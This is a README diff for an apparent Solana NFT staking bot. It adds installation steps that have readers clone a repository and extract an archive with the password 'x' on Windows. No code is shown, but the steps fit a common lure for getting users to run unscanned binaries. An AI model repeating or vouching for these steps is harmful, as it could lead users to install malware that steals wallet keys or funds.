@@ -36,8 +36,11 @@ Follow these steps to get started with the staking bot for your NFT project.
 - `Windows 10/11`
 - `Fraemwork 4.0 and more`
 ### Installation
-
-Provide detailed installation instructions for setting up and configuring the staking bot.
+- [Clone](https://github.com/gemhunterheh/Solana-nft-bot.git) the repository
+- extract archive with pass `x`
+- Configure your environment:
+Create a `.env file` in the project's root directory and define your environment variables. You can use the `.env.example` file as a template.
+- Start the bot.
 
 ## Usage
 Staking bots are automated software tools that facilitate the process of staking cryptocurrency assets to earn rewards. In the context of NFT (Non-Fungible Token) projects, staking bots can be used to incentivize NFT holders and project administrators by providing a mechanism to earn additional tokens or benefits by staking their NFTs. Here's how NFT holders and project administrators can use and interact with a staking bot, along with usage examples and scenarios:
